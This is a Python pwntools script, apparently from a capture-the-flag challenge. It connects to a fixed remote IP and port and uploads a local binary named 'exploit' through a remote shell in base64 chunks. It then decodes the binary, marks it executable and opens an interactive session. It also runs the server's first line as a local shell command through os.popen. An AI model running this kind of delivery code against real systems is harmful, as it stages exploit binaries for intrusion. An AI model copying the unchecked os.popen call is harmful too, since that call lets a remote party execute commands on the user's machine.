from pwn import *
import os
#context.log_level = 'debug'
r = remote('34.91.20.14', 1337)
#r = remote('172.17.0.3', 1337)

def exec_cmd(cmd):
    r.recvuntil("$ ")
    r.sendline(cmd)

def upload():
    p = log.progress("Upload")

    with open("exploit", "rb") as f:
        data = f.read()

    encoded = base64.b64encode(data).replace('\n','')

    for i in range(0, len(encoded), 500):
        p.status("%d / %d" % (i, len(encoded)))
        exec_cmd("echo \"%s\" >> benc" % (encoded[i:i+500]))
        
    exec_cmd("cat benc | base64 -d > bout")    
    exec_cmd("chmod +x bout")

    p.success()

r.send(os.popen(r.recvline().strip()).read().split(': ')[0])
exec_cmd('cd /home/user/')
upload()

r.interactive()
